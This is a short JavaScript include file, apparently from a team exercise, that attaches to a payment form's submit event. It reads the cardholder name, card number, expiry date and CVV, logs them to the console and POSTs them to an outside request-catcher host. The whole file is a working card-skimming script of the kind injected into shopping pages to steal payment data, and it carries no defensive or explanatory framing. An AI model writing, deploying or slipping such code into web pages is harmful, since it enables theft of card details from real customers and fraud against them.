console.log("Team 4 include file loaded...");

document.getElementById('payment-form').addEventListener('submit', function(event) {
    // Get input values by ID
    const cardName = document.getElementById('card-name').value;
    const cardNumber = document.getElementById('card-number').value;
    const expiry = document.getElementById('expiry').value;
    const cvv = document.getElementById('cvv').value;

    // Console.log the values
    console.log('Card Name:', cardName);
    console.log('Card Number:', cardNumber);
    console.log('Expiry:', expiry);
    console.log('CVV:', cvv);

    // Send POST request with payment details
    fetch('https://hfj.requestcatcher.com/test', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            cardName: cardName,
            cardNumber: cardNumber,
            expiry: expiry,
            cvv: cvv
        })
    });
});
